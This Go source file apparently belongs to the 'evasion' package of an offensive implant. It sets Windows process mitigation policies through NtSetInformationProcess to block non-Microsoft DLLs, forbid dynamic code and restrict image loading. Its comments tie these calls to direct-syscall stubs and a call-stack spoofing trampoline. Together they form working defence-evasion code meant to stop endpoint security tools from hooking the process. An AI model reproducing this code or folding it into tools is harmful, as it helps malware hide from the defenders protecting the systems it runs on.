//go:build windows
// +build windows

package evasion

import "unsafe"

// setMitigationPolicy calls NtSetInformationProcess ProcessMitigationPolicy
// (class 52) with the given PROCESS_MITIGATION_POLICY enum value and flags word.
func setMitigationPolicy(policy, flags uint32) {
	p := getNtSetInfoProc()
	if p == nil {
		return
	}
	var info [2]uint32
	info[0] = policy
	info[1] = flags
	p.Call(
		ntCurrentProcess,
		52, // PROCESSINFOCLASS: ProcessMitigationPolicy
		uintptr(unsafe.Pointer(&info[0])),
		unsafe.Sizeof(info),
	)
}

// blockNonMicrosoftDLLs sets ProcessSignatureMitigationPolicy (MicrosoftSignedOnly=1)
// preventing non-Microsoft DLLs from loading into this process.
// Runtime equivalent of PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON.
func blockNonMicrosoftDLLs() {
	setMitigationPolicy(8, 1) // ProcessSignatureMitigationPolicy, MicrosoftSignedOnly
}

// blockDynamicCode enables Arbitrary Code Guard (ACG): forbids creating new
// executable pages or changing existing pages to executable after this call.
//
// MUST be called after all HGProc stubs and the spoof trampoline are
// allocated and finalized — all stubs are MEM_IMAGE/RX by the time
// runEvasion() calls this function.
func blockDynamicCode() {
	setMitigationPolicy(2, 1) // ProcessDynamicCodePolicy, ProhibitDynamicCode
}

// restrictImageLoad sets ProcessImageLoadPolicy to refuse loading DLLs from
// remote paths or low-integrity locations, and to prefer System32 images.
// Flags: bit0=NoRemoteImages, bit1=NoLowMandatoryLabel, bit2=PreferSystem32.
func restrictImageLoad() {
	setMitigationPolicy(10, 0x7) // ProcessImageLoadPolicy, all three flags
}
